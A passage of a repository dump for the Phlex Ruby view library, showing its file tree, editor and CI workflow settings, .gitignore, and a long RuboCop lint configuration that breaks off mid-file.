├── .editorconfig
├── .github
    ├── FUNDING.yml
    ├── dependabot.yml
    └── workflows
    │   ├── ci.yml
    │   └── coverage.yml
├── .gitignore
├── .rubocop-https---www-goodcop-style-base-yml
├── .rubocop-https---www-goodcop-style-tabs-yml
├── .rubocop.yml
├── .ruby-version
├── CODE_OF_CONDUCT.md
├── CONTRIBUTING.md
├── Gemfile
├── LICENSE.txt
├── README.md
├── SECURITY.md
├── bench.rb
├── bin
    ├── console
    ├── coverage
    └── test
├── browser_tests.rb
├── config
    ├── quickdraw.rb
    └── sus.rb
├── fixtures
    ├── components.rb
    ├── components
    │   ├── article.rb
    │   └── say_hi.rb
    ├── layout.rb
    ├── page.rb
    ├── sgml_helper.rb
    ├── view_helper.rb
    ├── xss.txt
    └── xss
    │   └── LICENSE.txt
├── lib
    ├── phlex.rb
    └── phlex
    │   ├── csv.rb
    │   ├── error.rb
    │   ├── errors
    │       ├── argument_error.rb
    │       ├── double_render_error.rb
    │       ├── name_error.rb
    │       └── runtime_error.rb
    │   ├── fifo.rb
    │   ├── fifo_cache_store.rb
    │   ├── helpers.rb
    │   ├── html.rb
    │   ├── html
    │       ├── standard_elements.rb
    │       └── void_elements.rb
    │   ├── kit.rb
    │   ├── sgml.rb
    │   ├── sgml
    │       ├── elements.rb
    │       ├── safe_object.rb
    │       ├── safe_value.rb
    │       └── state.rb
    │   ├── svg.rb
    │   ├── svg
    │       └── standard_elements.rb
    │   └── version.rb
├── mise.toml
├── phlex.gemspec
├── quickdraw
    ├── attribute_cache_expansion.test.rb
    ├── caching.test.rb
    ├── context.test.rb
    ├── csv.test.rb
    ├── erb.test.rb
    ├── fifo.test.rb
    ├── fifo_cache_store.test.rb
    ├── helpers
    │   ├── grab.test.rb
    │   └── mix.test.rb
    ├── html.test.rb
    ├── html
    │   ├── doctype.test.rb
    │   ├── standard_elements.test.rb
    │   ├── svg.test.rb
    │   └── void_elements.test.rb
    ├── inline.test.rb
    ├── kit.test.rb
    ├── selective_rendering_from_cache.test.rb
    ├── sgml.test.rb
    ├── sgml
    │   ├── attributes.test.rb
    │   ├── callbacks.test.rb
    │   ├── capture.test.rb
    │   ├── comment.test.rb
    │   ├── conditional_rendering.test.rb
    │   ├── content_yielding.test.rb
    │   ├── plain.test.rb
    │   ├── raw.test.rb
    │   ├── safe.test.rb
    │   ├── selective_rendering.test.rb
    │   ├── to_proc.test.rb
    │   └── whitespace.test.rb
    ├── svg.test.rb
    ├── svg
    │   └── standard_elements.test.rb
    ├── tag.test.rb
    └── 💪.test.rb
└── test
    └── phlex
        └── view
            ├── custom_elements.rb
            ├── lowercase_symbolic_id_guard.rb
            └── naughty_business.rb


/.editorconfig:
--------------------------------------------------------------------------------
 1 | root = true
 2 |
 3 | [*]
 4 | indent_style = tab
 5 | indent_size = 2
 6 |
 7 | [*.yml]
 8 | indent_style = space
 9 | indent_size = 2
10 |
11 | [*.erb]
12 | indent_style = space
13 | indent_size = 2
14 |


--------------------------------------------------------------------------------
/.github/FUNDING.yml:
--------------------------------------------------------------------------------
1 | # These are supported funding model platforms
2 |
3 | github: [joeldrapper]
4 |


--------------------------------------------------------------------------------
/.github/dependabot.yml:
--------------------------------------------------------------------------------
1 | version: 2
2 | updates:
3 |   - package-ecosystem: "github-actions"
4 |     directory: "/"
5 |     schedule:
6 |       interval: "weekly"
7 |


--------------------------------------------------------------------------------
/.github/workflows/ci.yml:
--------------------------------------------------------------------------------
 1 | name: CI
 2 | on:
 3 |   push:
 4 |     branches: ["main"]
 5 |   pull_request:
 6 |     branches: ["main"]
 7 | jobs:
 8 |   tests:
 9 |     strategy:
10 |       fail-fast: false
11 |       matrix:
12 |         os: ["ubuntu-latest", "macos-latest"]
13 |         ruby-version:
14 |           - "3.2"
15 |           - "3.3"
16 |           - "3.4"
17 |           - "head"
18 |           - "truffleruby"
19 |           - "truffleruby-head"
20 |
21 |     runs-on: ${{ matrix.os }}
22 |     steps:
23 |       - uses: actions/checkout@v4
24 |
25 |       - name: Setup
26 |         uses: ruby/setup-ruby@v1
27 |         with:
28 |           ruby-version: ${{ matrix.ruby-version }}
29 |           bundler-cache: false
30 |
31 |       - name: Install dependencies
32 |         run: |
33 |           bundle install --jobs 4 --without development
34 |
35 |       - name: Sus Tests
36 |         run: bundle exec sus
37 |
38 |       - name: Quickdraw Tests
39 |         run: bundle exec qt -t 1
40 |
41 |   rubocop:
42 |     runs-on: "ubuntu-latest"
43 |     steps:
44 |       - uses: actions/checkout@v4
45 |
46 |       - name: Setup
47 |         uses: ruby/setup-ruby@v1
48 |         with:
49 |           ruby-version: "3.4"
50 |           bundler-cache: false
51 |
52 |       - name: Install dependencies
53 |         run: |
54 |           bundle install --jobs 4
55 |
56 |       - name: Rubocop
57 |         run: bundle exec rubocop
58 |


--------------------------------------------------------------------------------
/.github/workflows/coverage.yml:
--------------------------------------------------------------------------------
 1 | name: Deploy coverage report
 2 |
 3 | on:
 4 |   push:
 5 |     branches: ["main"]
 6 |
 7 |   # Allows you to run this workflow manually from the Actions tab
 8 |   workflow_dispatch:
 9 |
10 | # Sets permissions of the GITHUB_TOKEN to allow deployment to GitHub Pages
11 | permissions:
12 |   contents: read
13 |   pages: write
14 |   id-token: write
15 |
16 | # Allow one concurrent deployment
17 | concurrency:
18 |   group: "pages"
19 |   cancel-in-progress: true
20 |
21 | jobs:
22 |   # Single deploy job since we're just deploying
23 |   deploy:
24 |     environment:
25 |       name: github-pages
26 |       url: ${{ steps.deployment.outputs.page_url }}
27 |     runs-on: ubuntu-latest
28 |     steps:
29 |       - name: Checkout
30 |         uses: actions/checkout@v4
31 |
32 |       - name: Set up Ruby
33 |         uses: ruby/setup-ruby@v1
34 |         with:
35 |           ruby-version: "3.4"
36 |           bundler-cache: false
37 |
38 |       - name: Install dependencies
39 |         run: |
40 |           bundle install --jobs 4 --without development
41 |
42 |       - name: Generate coverage report
43 |         run: |
44 |           COVERAGE=true bundle exec qt
45 |
46 |       - name: Setup Pages
47 |         uses: actions/configure-pages@v5
48 |
49 |       - name: Upload artifact
50 |         uses: actions/upload-pages-artifact@v3
51 |         with:
52 |           path: "./coverage"
53 |
54 |       - name: Deploy to GitHub Pages
55 |         id: deployment
56 |         uses: actions/deploy-pages@v4
57 |


--------------------------------------------------------------------------------
/.gitignore:
--------------------------------------------------------------------------------
 1 | /.bundle/
 2 | /.yardoc
 3 | /_yardoc/
 4 | /coverage/
 5 | /doc/
 6 | /pkg/
 7 | /spec/reports/
 8 | /tmp/
 9 | /spec/examples.txt
10 | /spec/internal/**/log/*
11 | node_modules
12 | /docs/dist
13 | Gemfile.lock
14 | .covered.db
15 | .DS_Store
16 | .gem
17 |


--------------------------------------------------------------------------------
/.rubocop-https---www-goodcop-style-base-yml:
--------------------------------------------------------------------------------
   1 | ---
   2 | AllCops:
   3 |   DisabledByDefault: true
   4 |
   5 | Layout/ArgumentAlignment:
   6 |   Enabled: true
   7 |   EnforcedStyle: with_fixed_indentation
   8 |
   9 | Layout/ArrayAlignment:
  10 |   Enabled: true
  11 |   EnforcedStyle: with_fixed_indentation
  12 |
  13 | Layout/AssignmentIndentation:
  14 |   Enabled: true
  15 |
  16 | Layout/BeginEndAlignment:
  17 |   Enabled: true
  18 |   EnforcedStyleAlignWith: start_of_line
  19 |
  20 | Layout/BlockAlignment:
  21 |   Enabled: true
  22 |   EnforcedStyleAlignWith: either
  23 |
  24 | Layout/BlockEndNewline:
  25 |   Enabled: true
  26 |
  27 | Layout/ClosingHeredocIndentation:
  28 |   Enabled: true
  29 |
  30 | Layout/ClosingParenthesisIndentation:
  31 |   Enabled: true
  32 |
  33 | Layout/CommentIndentation:
  34 |   Enabled: true
  35 |   AllowForAlignment: true
  36 |
  37 | Layout/ConditionPosition:
  38 |   Enabled: true
  39 |
  40 | Layout/DefEndAlignment:
  41 |   Enabled: true
  42 |   EnforcedStyleAlignWith: start_of_line
  43 |
  44 | Layout/DotPosition:
  45 |   Enabled: true
  46 |   EnforcedStyle: leading
  47 |
  48 | Layout/ElseAlignment:
  49 |   Enabled: true
  50 |
  51 | Layout/EmptyComment:
  52 |   Enabled: true
  53 |   AllowBorderComment: true
  54 |   AllowMarginComment: true
  55 |
  56 | Layout/EmptyLineAfterMagicComment:
  57 |   Enabled: true
  58 |
  59 | Layout/EmptyLineAfterMultilineCondition:
  60 |   Enabled: true
  61 |
  62 | Layout/EmptyLineBetweenDefs:
  63 |   Enabled: true
  64 |   EmptyLineBetweenMethodDefs: true
  65 |   EmptyLineBetweenClassDefs: true
  66 |   EmptyLineBetweenModuleDefs: true
  67 |   AllowAdjacentOneLineDefs: true
  68 |   NumberOfEmptyLines: 1
  69 |
  70 | Layout/EmptyLines:
  71 |   Enabled: true
  72 |
  73 | Layout/EmptyLinesAroundAccessModifier:
  74 |   Enabled: true
  75 |   EnforcedStyle: around
  76 |
  77 | Layout/EmptyLinesAroundArguments:
  78 |   Enabled: true
  79 |
  80 | Layout/EmptyLinesAroundAttributeAccessor:
  81 |   Enabled: true
  82 |   AllowAliasSyntax: true
  83 |   AllowedMethods:
  84 |     - alias_method
  85 |     - public
  86 |     - protected
  87 |     - private
  88 |
  89 | Layout/EmptyLinesAroundBeginBody:
  90 |   Enabled: true
  91 |
  92 | Layout/EmptyLinesAroundBlockBody:
  93 |   Enabled: true
  94 |
  95 | Layout/EmptyLinesAroundClassBody:
  96 |   Enabled: true
  97 |   EnforcedStyle: no_empty_lines
  98 |
  99 | Layout/EmptyLinesAroundExceptionHandlingKeywords:
 100 |   Enabled: true
 101 |
 102 | Layout/EmptyLinesAroundMethodBody:
 103 |   Enabled: true
 104 |
 105 | Layout/EmptyLinesAroundModuleBody:
 106 |   Enabled: true
 107 |   EnforcedStyle: no_empty_lines
 108 |
 109 | Layout/EndAlignment:
 110 |   Enabled: true
 111 |   EnforcedStyleAlignWith: start_of_line
 112 |
 113 | Layout/EndOfLine:
 114 |   Enabled: true
 115 |   EnforcedStyle: native
 116 |
 117 | Layout/ExtraSpacing:
 118 |   Enabled: true
 119 |   AllowForAlignment: true
 120 |   AllowBeforeTrailingComments: false
 121 |   ForceEqualSignAlignment: false
 122 |
 123 | Layout/FirstArrayElementLineBreak:
 124 |   Enabled: true
 125 |   AllowMultilineFinalElement: false
 126 |
 127 | Layout/FirstHashElementLineBreak:
 128 |   Enabled: true
 129 |   AllowMultilineFinalElement: false
 130 |
 131 | Layout/FirstParameterIndentation:
 132 |   Enabled: true
 133 |   EnforcedStyle: consistent
 134 |
 135 | Layout/HashAlignment:
 136 |   Enabled: true
 137 |   EnforcedHashRocketStyle: key
 138 |   EnforcedColonStyle: key
 139 |   EnforcedLastArgumentHashStyle: always_inspect
 140 |
 141 | Layout/HeredocArgumentClosingParenthesis:
 142 |   Enabled: true
 143 |
 144 | Layout/HeredocIndentation:
 145 |   Enabled: true
 146 |
 147 | Layout/IndentationConsistency:
 148 |   Enabled: true
 149 |   EnforcedStyle: normal
 150 |
 151 | Layout/IndentationStyle:
 152 |   Enabled: true
 153 |   EnforcedStyle: spaces
 154 |
 155 | Layout/IndentationWidth:
 156 |   Enabled: true
 157 |   Width: 2
 158 |
 159 | Layout/InitialIndentation:
 160 |   Enabled: true
 161 |
 162 | Layout/LeadingCommentSpace:
 163 |   Enabled: true
 164 |   AllowRBSInlineAnnotation: true
 165 |
 166 | Layout/LeadingEmptyLines:
 167 |   Enabled: true
 168 |
 169 | Layout/LineContinuationSpacing:
 170 |   Enabled: true
 171 |   EnforcedStyle: space
 172 |
 173 | Layout/LineEndStringConcatenationIndentation:
 174 |   Enabled: true
 175 |   EnforcedStyle: indented
 176 |
 177 | Layout/MultilineArrayBraceLayout:
 178 |   Enabled: true
 179 |   EnforcedStyle: new_line
 180 |
 181 | Layout/MultilineArrayLineBreaks:
 182 |   Enabled: true
 183 |   AllowMultilineFinalElement: false
 184 |
 185 | Layout/MultilineAssignmentLayout:
 186 |   Enabled: true
 187 |   EnforcedStyle: same_line
 188 |
 189 | Layout/MultilineBlockLayout:
 190 |   Enabled: true
 191 |
 192 | Layout/MultilineHashBraceLayout:
 193 |   Enabled: true
 194 |   EnforcedStyle: new_line
 195 |
 196 | Layout/MultilineHashKeyLineBreaks:
 197 |   Enabled: true
 198 |   AllowMultilineFinalElement: false
 199 |
 200 | Layout/MultilineMethodCallIndentation:
 201 |   Enabled: true
 202 |   EnforcedStyle: indented
 203 |
 204 | Layout/MultilineMethodDefinitionBraceLayout:
 205 |   Enabled: true
 206 |   EnforcedStyle: new_line
 207 |
 208 | Layout/MultilineOperationIndentation:
 209 |   Enabled: true
 210 |   EnforcedStyle: indented
 211 |
 212 | Layout/ParameterAlignment:
 213 |   Enabled: true
 214 |   EnforcedStyle: with_fixed_indentation
 215 |
 216 | Layout/RescueEnsureAlignment:
 217 |   Enabled: true
 218 |
 219 | Layout/SpaceAfterColon:
 220 |   Enabled: true
 221 |
 222 | Layout/SpaceAfterComma:
 223 |   Enabled: true
 224 |
 225 | Layout/SpaceAfterMethodName:
 226 |   Enabled: true
 227 |
 228 | Layout/SpaceAfterNot:
 229 |   Enabled: true
 230 |
 231 | Layout/SpaceAfterSemicolon:
 232 |   Enabled: true
 233 |
 234 | Layout/SpaceAroundBlockParameters:
 235 |   Enabled: true
 236 |   EnforcedStyleInsidePipes: no_space
 237 |
 238 | Layout/SpaceAroundEqualsInParameterDefault:
 239 |   Enabled: true
 240 |   EnforcedStyle: space
 241 |
 242 | Layout/SpaceAroundKeyword:
 243 |   Enabled: true
 244 |
 245 | Layout/SpaceAroundMethodCallOperator:
 246 |   Enabled: true
 247 |
 248 | Layout/SpaceAroundOperators:
 249 |   Enabled: true
 250 |   AllowForAlignment: false
 251 |   EnforcedStyleForExponentOperator: space
 252 |   EnforcedStyleForRationalLiterals: space
 253 |
 254 | Layout/SpaceBeforeBlockBraces:
 255 |   Enabled: true
 256 |   EnforcedStyle: space
 257 |   EnforcedStyleForEmptyBraces: space
 258 |
 259 | Layout/SpaceBeforeBrackets:
 260 |   Enabled: true
 261 |
 262 | Layout/SpaceBeforeComma:
 263 |   Enabled: true
 264 |
 265 | Layout/SpaceBeforeComment:
 266 |   Enabled: true
 267 |
 268 | Layout/SpaceBeforeFirstArg:
 269 |   Enabled: true
 270 |
 271 | Layout/SpaceBeforeSemicolon:
 272 |   Enabled: true
 273 |
 274 | Layout/SpaceInLambdaLiteral:
 275 |   Enabled: true
 276 |   EnforcedStyle: require_space
 277 |
 278 | Layout/SpaceInsideArrayLiteralBrackets:
 279 |   Enabled: true
 280 |   EnforcedStyle: no_space
 281 |
 282 | Layout/SpaceInsideArrayPercentLiteral:
 283 |   Enabled: true
 284 |
 285 | Layout/SpaceInsideBlockBraces:
 286 |   Enabled: true
 287 |   EnforcedStyle: space
 288 |   EnforcedStyleForEmptyBraces: no_space
 289 |   SpaceBeforeBlockParameters: true
 290 |
 291 | Layout/SpaceInsideHashLiteralBraces:
 292 |   Enabled: true
 293 |   EnforcedStyle: space
 294 |   EnforcedStyleForEmptyBraces: no_space
 295 |
 296 | Layout/SpaceInsideParens:
 297 |   Enabled: true
 298 |   EnforcedStyle: no_space
 299 |
 300 | Layout/SpaceInsidePercentLiteralDelimiters:
 301 |   Enabled: true
 302 |
 303 | Layout/SpaceInsideRangeLiteral:
 304 |   Enabled: true
 305 |
 306 | Layout/SpaceInsideReferenceBrackets:
 307 |   Enabled: true
 308 |   EnforcedStyle: no_space
 309 |   EnforcedStyleForEmptyBrackets: no_space
 310 |
 311 | Layout/SpaceInsideStringInterpolation:
 312 |   Enabled: true
 313 |   EnforcedStyle: no_space
 314 |
 315 | Layout/TrailingEmptyLines:
 316 |   Enabled: true
 317 |   EnforcedStyle: final_newline
 318 |
 319 | Layout/TrailingWhitespace:
 320 |   Enabled: true
 321 |   AllowInHeredoc: true
 322 |
 323 | Lint/AmbiguousAssignment:
 324 |   Enabled: true
 325 |
 326 | Lint/AmbiguousOperator:
 327 |   Enabled: true
 328 |
 329 | Lint/AmbiguousOperatorPrecedence:
 330 |   Enabled: true
 331 |
 332 | Lint/AmbiguousRange:
 333 |   Enabled: true
 334 |   RequireParenthesesForMethodChains: true
 335 |
 336 | Lint/AmbiguousRegexpLiteral:
 337 |   Enabled: true
 338 |
 339 | Lint/AssignmentInCondition:
 340 |   Enabled: true
 341 |   AllowSafeAssignment: true
 342 |
 343 | Lint/BigDecimalNew:
 344 |   Enabled: true
 345 |
 346 | Lint/CircularArgumentReference:
 347 |   Enabled: true
 348 |
 349 | Lint/ConstantDefinitionInBlock:
 350 |   Enabled: true
 351 |
 352 | Lint/ConstantOverwrittenInRescue:
 353 |   Enabled: true
 354 |
 355 | Lint/Debugger:
 356 |   Enabled: true
 357 |
 358 | Lint/DeprecatedClassMethods:
 359 |   Enabled: true
 360 |
 361 | Lint/DeprecatedConstants:
 362 |   Enabled: true
 363 |
 364 | Lint/DeprecatedOpenSSLConstant:
 365 |   Enabled: true
 366 |
 367 | Lint/DisjunctiveAssignmentInConstructor:
 368 |   Enabled: true
 369 |
 370 | Lint/DuplicateCaseCondition:
 371 |   Enabled: true
 372 |
 373 | Lint/DuplicateHashKey:
 374 |   Enabled: true
 375 |
 376 | Lint/DuplicateMagicComment:
 377 |   Enabled: true
 378 |
 379 | Lint/DuplicateMatchPattern:
 380 |   Enabled: true
 381 |
 382 | Lint/DuplicateMethods:
 383 |   Enabled: true
 384 |
 385 | Lint/DuplicateRegexpCharacterClassElement:
 386 |   Enabled: true
 387 |
 388 | Lint/DuplicateRequire:
 389 |   Enabled: true
 390 |
 391 | Lint/DuplicateRescueException:
 392 |   Enabled: true
 393 |
 394 | Lint/EachWithObjectArgument:
 395 |   Enabled: true
 396 |
 397 | Lint/ElseLayout:
 398 |   Enabled: true
 399 |
 400 | Lint/EmptyBlock:
 401 |   Enabled: true
 402 |   AllowComments: true
 403 |   AllowEmptyLambdas: true
 404 |
 405 | Lint/EmptyConditionalBody:
 406 |   Enabled: true
 407 |   AllowComments: true
 408 |
 409 | Lint/EmptyEnsure:
 410 |   Enabled: true
 411 |
 412 | Lint/EmptyExpression:
 413 |   Enabled: true
 414 |
 415 | Lint/EmptyFile:
 416 |   Enabled: true
 417 |   AllowComments: true
 418 |
 419 | Lint/EmptyInPattern:
 420 |   Enabled: true
 421 |   AllowComments: true
 422 |
 423 | Lint/EmptyInterpolation:
 424 |   Enabled: true
 425 |
 426 | Lint/EnsureReturn:
 427 |   Enabled: true
 428 |
 429 | Lint/ErbNewArguments:
 430 |   Enabled: true
 431 |
 432 | Lint/FlipFlop:
 433 |   Enabled: true
 434 |
 435 | Lint/FloatComparison:
 436 |   Enabled: true
 437 |
 438 | Lint/FloatOutOfRange:
 439 |   Enabled: true
 440 |
 441 | Lint/FormatParameterMismatch:
 442 |   Enabled: true
 443 |
 444 | Lint/HashCompareByIdentity:
 445 |   Enabled: true
 446 |
 447 | Lint/HeredocMethodCallPosition:
 448 |   Enabled: true
 449 |
 450 | Lint/IdentityComparison:
 451 |   Enabled: true
 452 |
 453 | Lint/ImplicitStringConcatenation:
 454 |   Enabled: true
 455 |
 456 | Lint/IncompatibleIoSelectWithFiberScheduler:
 457 |   Enabled: true
 458 |
 459 | Lint/IneffectiveAccessModifier:
 460 |   Enabled: true
 461 |
 462 | Lint/InheritException:
 463 |   Enabled: true
 464 |
 465 | Lint/InterpolationCheck:
 466 |   Enabled: true
 467 |
 468 | Lint/ItWithoutArgumentsInBlock:
 469 |   Enabled: true
 470 |
 471 | Lint/LambdaWithoutLiteralBlock:
 472 |   Enabled: true
 473 |
 474 | Lint/LiteralAssignmentInCondition:
 475 |   Enabled: true
 476 |
 477 | Lint/LiteralInInterpolation:
 478 |   Enabled: true
 479 |
 480 | Lint/MissingCopEnableDirective:
 481 |   Enabled: true
 482 |
 483 | Lint/MultipleComparison:
 484 |   Enabled: true
 485 |
 486 | Lint/NestedPercentLiteral:
 487 |   Enabled: true
 488 |
 489 | Lint/NextWithoutAccumulator:
 490 |   Enabled: true
 491 |
 492 | Lint/NoReturnInBeginEndBlocks:
 493 |   Enabled: true
 494 |
 495 | Lint/NonAtomicFileOperation:
 496 |   Enabled: true
 497 |
 498 | Lint/NonDeterministicRequireOrder:
 499 |   Enabled: true
 500 |
 501 | Lint/NonLocalExitFromIterator:
 502 |   Enabled: true
 503 |
 504 | Lint/NumberedParameterAssignment:
 505 |   Enabled: true
 506 |
 507 | Lint/OrAssignmentToConstant:
 508 |   Enabled: true
 509 |
 510 | Lint/OrderedMagicComments:
 511 |   Enabled: true
 512 |
 513 | Lint/OutOfRangeRegexpRef:
 514 |   Enabled: true
 515 |
 516 | Lint/ParenthesesAsGroupedExpression:
 517 |   Enabled: true
 518 |
 519 | Lint/RaiseException:
 520 |   Enabled: true
 521 |
 522 | Lint/RandOne:
 523 |   Enabled: true
 524 |
 525 | Lint/RedundantCopDisableDirective:
 526 |   Enabled: true
 527 |
 528 | Lint/RedundantCopEnableDirective:
 529 |   Enabled: true
 530 |
 531 | Lint/RedundantDirGlobSort:
 532 |   Enabled: true
 533 |
 534 | Lint/RedundantRegexpQuantifiers:
 535 |   Enabled: true
 536 |
 537 | Lint/RedundantRequireStatement:
 538 |   Enabled: true
 539 |
 540 | Lint/RedundantSafeNavigation:
 541 |   Enabled: true
 542 |
 543 | Lint/RedundantSplatExpansion:
 544 |   Enabled: true
 545 |   AllowPercentLiteralArrayArgument: true
 546 |
 547 | Lint/RedundantStringCoercion:
 548 |   Enabled: true
 549 |
 550 | Lint/RedundantWithIndex:
 551 |   Enabled: true
 552 |
 553 | Lint/RedundantWithObject:
 554 |   Enabled: true
 555 |
 556 | Lint/RefinementImportMethods:
 557 |   Enabled: true
 558 |
 559 | Lint/RegexpAsCondition:
 560 |   Enabled: true
 561 |
 562 | Lint/RequireParentheses:
 563 |   Enabled: true
 564 |
 565 | Lint/RequireRangeParentheses:
 566 |   Enabled: true
 567 |
 568 | Lint/RequireRelativeSelfPath:
 569 |   Enabled: true
 570 |
 571 | Lint/RescueType:
 572 |   Enabled: true
 573 |
 574 | Lint/ReturnInVoidContext:
 575 |   Enabled: true
 576 |
 577 | Lint/SafeNavigationChain:
 578 |   Enabled: true
 579 |
 580 | Lint/SafeNavigationConsistency:
 581 |   Enabled: true
 582 |
 583 | Lint/SafeNavigationWithEmpty:
 584 |   Enabled: true
 585 |
 586 | Lint/ScriptPermission:
 587 |   Enabled: true
 588 |
 589 | Lint/SelfAssignment:
 590 |   Enabled: true
 591 |
 592 | Lint/SendWithMixinArgument:
 593 |   Enabled: true
 594 |
 595 | Lint/ShadowedException:
 596 |   Enabled: true
 597 |
 598 | Lint/StructNewOverride:
 599 |   Enabled: true
 600 |
 601 | Lint/SuppressedException:
 602 |   Enabled: true
 603 |   AllowNil: true
 604 |   AllowComments: true
 605 |
 606 | Lint/SymbolConversion:
 607 |   Enabled: true
 608 |   EnforcedStyle: strict
 609 |
 610 | Lint/Syntax:
 611 |   Enabled: true
 612 |
 613 | Lint/ToEnumArguments:
 614 |   Enabled: true
 615 |
 616 | Lint/ToJSON:
 617 |   Enabled: true
 618 |
 619 | Lint/TopLevelReturnWithArgument:
 620 |   Enabled: true
 621 |
 622 | Lint/TrailingCommaInAttributeDeclaration:
 623 |   Enabled: true
 624 |
 625 | Lint/TripleQuotes:
 626 |   Enabled: true
 627 |
 628 | Lint/UnderscorePrefixedVariableName:
 629 |   Enabled: true
 630 |
 631 | Lint/UnexpectedBlockArity:
 632 |   Enabled: true
 633 |
 634 | Lint/UnifiedInteger:
 635 |   Enabled: true
 636 |
 637 | Lint/UnmodifiedReduceAccumulator:
 638 |   Enabled: true
 639 |
 640 | Lint/UnreachableCode:
 641 |   Enabled: true
 642 |
 643 | Lint/UriEscapeUnescape:
 644 |   Enabled: true
 645 |
 646 | Lint/UriRegexp:
 647 |   Enabled: true
 648 |
 649 | Lint/UselessAccessModifier:
 650 |   Enabled: true
 651 |
 652 | Lint/UselessElseWithoutRescue:
 653 |   Enabled: true
 654 |
 655 | Lint/UselessMethodDefinition:
 656 |   Enabled: true
 657 |
 658 | Lint/UselessRescue:
 659 |   Enabled: true
 660 |
 661 | Lint/UselessRuby2Keywords:
 662 |   Enabled: true
 663 |
 664 | Lint/UselessSetterCall:
 665 |   Enabled: true
 666 |
 667 | Lint/UselessTimes:
 668 |   Enabled: true
 669 |
 670 | Migration/DepartmentName:
 671 |   Enabled: true
 672 |
 673 | Security/CompoundHash:
 674 |   Enabled: true
 675 |
 676 | Security/IoMethods:
 677 |   Enabled: true
 678 |
 679 | Security/JSONLoad:
 680 |   Enabled: true
 681 |
 682 | Security/Open:
 683 |   Enabled: true
 684 |
 685 | Security/YAMLLoad:
 686 |   Enabled: true
 687 |
 688 | Style/ArgumentsForwarding:
 689 |   Enabled: true
 690 |
 691 | Style/AccessModifierDeclarations:
 692 |   Enabled: true
 693 |   EnforcedStyle: inline
 694 |
 695 | Style/ComparableClamp:
 696 |   Enabled: true
 697 |
 698 | Style/DefWithParentheses:
 699 |   Enabled: true
 700 |
 701 | Style/Dir:
 702 |   Enabled: true
 703 |
 704 | Style/DirEmpty:
 705 |   Enabled: true
 706 |
 707 | Style/EachForSimpleLoop:
 708 |   Enabled: true
 709 |
 710 | Style/EachWithObject:
 711 |   Enabled: true
 712 |
 713 | Style/EmptyBlockParameter:
 714 |   Enabled: true
 715 |
 716 | Style/EmptyElse:
 717 |   Enabled: true
 718 |   EnforcedStyle: empty
 719 |
 720 | Style/EmptyHeredoc:
 721 |   Enabled: true
 722 |
 723 | Style/EmptyLambdaParameter:
 724 |   Enabled: true
 725 |
 726 | Style/EnvHome:
 727 |   Enabled: true
 728 |
 729 | Style/ExactRegexpMatch:
 730 |   Enabled: true
 731 |
 732 | Style/ExpandPathArguments:
 733 |   Enabled: true
 734 |
 735 | Style/FrozenStringLiteralComment:
 736 |   Enabled: true
 737 |   EnforcedStyle: always
 738 |   SafeAutoCorrect: true
 739 |
 740 | Style/HashExcept:
 741 |   Enabled: true
 742 |
 743 | Style/HashLikeCase:
 744 |   Enabled: true
 745 |
 746 | Style/HashSyntax:
 747 |   Enabled: true
 748 |   EnforcedStyle: no_mixed_keys
 749 |   EnforcedShorthandSyntax: always
 750 |
 751 | Style/HashTransformKeys:
 752 |   Enabled: true
 753 |
 754 | Style/HashTransformValues:
 755 |   Enabled: true
 756 |
 757 | Style/IfWithSemicolon:
 758 |   Enabled: true
 759 |
 760 | Style/InPatternThen:
 761 |   Enabled: true
 762 |
 763 | Style/MagicCommentFormat:
 764 |   Enabled: true
 765 |
 766 | Style/MapCompactWithConditionalBlock:
 767 |   Enabled: true
 768 |
 769 | Style/MapToHash:
 770 |   Enabled: true
 771 |
 772 | Style/MapToSet:
 773 |   Enabled: true
 774 |
 775 | Style/MethodCallWithoutArgsParentheses:
 776 |   Enabled: true
 777 |
 778 | Style/MethodDefParentheses:
 779 |   Enabled: true
 780 |   EnforcedStyle: require_parentheses
 781 |
 782 | Style/ModuleFunction:
 783 |   Enabled: true
 784 |   EnforcedStyle: extend_self
 785 |
 786 | Style/MultilineIfModifier:
 787 |   Enabled: true
 788 |
 789 | Style/NegatedUnless:
 790 |   Enabled: true
 791 |
 792 | Style/NegatedWhile:
 793 |   Enabled: true
 794 |
 795 | Style/NumberedParameters:
 796 |   Enabled: true
 797 |   EnforcedStyle: disallow
 798 |
 799 | Style/NumericLiteralPrefix:
 800 |   Enabled: true
 801 |   EnforcedOctalStyle: zero_with_o
 802 |
 803 | Style/ObjectThen:
 804 |   Enabled: true
 805 |   EnforcedStyle: then
 806 |
 807 | Style/OperatorMethodCall:
 808 |   Enabled: true
 809 |
 810 | Style/OrAssignment:
 811 |   Enabled: true
 812 |
 813 | Style/PreferredHashMethods:
 814 |   Enabled: true
 815 |   EnforcedStyle: short
 816 |
 817 | Style/Proc:
 818 |   Enabled: true
 819 |
 820 | Style/QuotedSymbols:
 821 |   Enabled: true
 822 |   EnforcedStyle: same_as_string_literals
 823 |
 824 | Style/RaiseArgs:
 825 |   Enabled: true
 826 |   EnforcedStyle: compact
 827 |
 828 | Style/RandomWithOffset:
 829 |   Enabled: true
 830 |
 831 | Style/RedundantArrayConstructor:
 832 |   Enabled: true
 833 |
 834 | Style/RedundantAssignment:
 835 |   Enabled: true
 836 |
 837 | Style/RedundantBegin:
 838 |   Enabled: true
 839 |
 840 | Style/RedundantCondition:
 841 |   Enabled: true
 842 |
 843 | Style/RedundantConditional:
 844 |   Enabled: true
 845 |
 846 | Style/RedundantCurrentDirectoryInPath:
 847 |   Enabled: true
 848 |
 849 | Style/RedundantDoubleSplatHashBraces:
 850 |   Enabled: true
 851 |
 852 | Style/RedundantEach:
 853 |   Enabled: true
 854 |
 855 | Style/RedundantException:
 856 |   Enabled: true
 857 |
 858 | Style/RedundantFileExtensionInRequire:
 859 |   Enabled: true
 860 |
 861 | Style/RedundantFilterChain:
 862 |   Enabled: true
 863 |
 864 | Style/RedundantFreeze:
 865 |   Enabled: true
 866 |
 867 | Style/RedundantHeredocDelimiterQuotes:
 868 |   Enabled: true
 869 |
 870 | Style/RedundantInitialize:
 871 |   Enabled: true
 872 |   AllowComments: true
 873 |
 874 | Style/RedundantInterpolation:
 875 |   Enabled: true
 876 |
 877 | Style/RedundantLineContinuation:
 878 |   Enabled: true
 879 |
 880 | Style/RedundantRegexpArgument:
 881 |   Enabled: true
 882 |
 883 | Style/RedundantRegexpCharacterClass:
 884 |   Enabled: true
 885 |
 886 | Style/RedundantRegexpConstructor:
 887 |   Enabled: true
 888 |
 889 | Style/RedundantRegexpEscape:
 890 |   Enabled: true
 891 |
 892 | Style/RedundantReturn:
 893 |   Enabled: true
 894 |   AllowMultipleReturnValues: true
 895 |
